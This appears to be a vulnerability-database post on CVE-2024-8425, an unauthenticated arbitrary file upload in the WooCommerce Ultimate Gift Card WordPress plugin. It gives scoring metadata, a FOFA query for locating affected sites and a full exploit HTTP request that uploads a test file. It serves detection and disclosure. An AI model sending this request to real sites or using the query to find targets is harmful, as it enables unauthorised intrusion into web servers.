---
layout: "post"
cve_id: "CVE-2024-8425"
title: "WooCommerce Ultimate Gift Card ‚â§ 2.6.0 - Arbitrary File Upload"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-8425.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-8425.yaml"
author: "jsnv-dev"
severity: "critical"
reference:
  - "https://github.com/KTN1990/CVE-2024-8425"
  - "https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/woocommerce-ultimate-gift-card/woocommerce-ultimate-gift-card-260-unauthenticated-arbitrary-file-upload"
  - "https://nvd.nist.gov/vuln/detail/CVE-2024-8425"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
  cvss-score: 9.8
  cve-id: "CVE-2024-8425"
  epss-score: 0.62585
  epss-percentile: 0.98273
  cwe-id: "CWE-434"
  cpe: "cpe:2.3:a:wpswings:woocommerce_ultimate_gift_card:*:*:*:*:*:wordpress:*:*"
metadata:
  verified: True
  max-request: 2
  vendor: "wpswings"
  product: "woocommerce_ultimate_gift_card"
  fofa-query: "body=\"/wp-content/plugins/woocommerce-ultimate-gift-card\""
tags:
  - "cve"
  - "cve2024"
  - "wp"
  - "wp-plugin"
  - "wordpress"
  - "woocommerce"
  - "woocommerce-ultimate-gift-card"
  - "file-upload"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## üîç Vulnerability Description
The WooCommerce Ultimate Gift Card plugin for WordPress is vulnerable to arbitrary file uploads due to insufficient file type validation in the 'mwb_wgm_preview_mail' and 'mwb_wgm_woocommerce_add_cart_item_data' functions in all versions up to, and including, 2.6.0. This makes it possible for unauthenticated attackers to upload arbitrary files on the affected site's server which may make remote code execution possible.


## üåê HTTP Request
```nohighlight
POST /wp-admin/admin-ajax.php?action=mwb_wgm_preview_mail HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13.2) AppleWebKit/619.14.1 (KHTML, like Gecko) Version/17.7.52 Safari/619.14.1
Connection: close
Content-Length: 486
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary183179
Accept-Encoding: gzip

------WebKitFormBoundary183179
Content-Disposition: form-data; name="mwb_wgm_preview_email"

test
------WebKitFormBoundary183179
Content-Disposition: form-data; name="tempId"

1
------WebKitFormBoundary183179
Content-Disposition: form-data; name="message"

36gwyueWTE3m3EzrqG49LdnMw7c
------WebKitFormBoundary183179
Content-Disposition: form-data; name="file"; filename="scqFIjGI"
Content-Type: image/jpeg

36gwyueWTE3m3EzrqG49LdnMw7c
------WebKitFormBoundary183179--
```


